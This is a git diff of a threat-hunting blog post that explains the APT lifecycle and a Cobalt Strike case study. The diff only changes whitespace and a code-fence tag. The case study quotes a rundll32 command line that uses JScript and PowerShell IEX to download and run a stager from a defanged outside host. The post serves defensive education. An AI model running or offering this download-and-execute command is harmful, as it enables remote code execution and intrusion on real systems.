@@ -4,15 +4,11 @@ layout: "post"
 ---
 
 __Threat__ __hunting__ - the act of aggressively intercepting, tracking and eliminating cyber adversaries as early as possible in the Cyber Kill Chain.
-
-
-
-
-
-
-
 To prevent, detect and resolve an APT, you must recognize its characteristics. 
 Most APTs follow the same basic life cycle of infiltrating a network, expanding access and achieving the goal of the attack, which is most commonly stealing data by extracting it from the network.
+
+
+
 
 - 1 In the first phase, usually referred to "Initial Access", advanced persistent threats often gain access through social engineering techniques. One indication of an APT is a phishing email that selectively targets high-level individuals like senior executives or technology leaders, often using information obtained from other team members that have already been compromised. Email attacks that target specific individuals are called “spear-phishing.”
 - 2 In the second phase, usually referred to "Lateral Movement" attackers insert malware into an organization’s network to move to the second phase, expansion. They move laterally to map the network and gather credentials such as account names and passwords in order to access critical business information.
@@ -97,7 +93,7 @@ Below some example of typical `LOLBAS` software abused by APT.
 In the case study presented below the threat actor uses `Cobalt Strike` beacon for their post-exploitation activities with a __PowerShell__ stager generated from the Cobalt Strike framework.
 The telemetry shows this attack launched by abusing `rundll32.exe` and the command line invoking __JScript__ code to download a web page and launch the initial __PowerShell__ stager.
 
-```javascript
+```js
 rundll32.exe javascript:\\..\\mshtml,RunHTMLApplication ;document.write();new%20ActiveXObject(WScript.Shell).Run(powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('hxxps://stjohnplece.co/lll/webax.js');
 ```
 
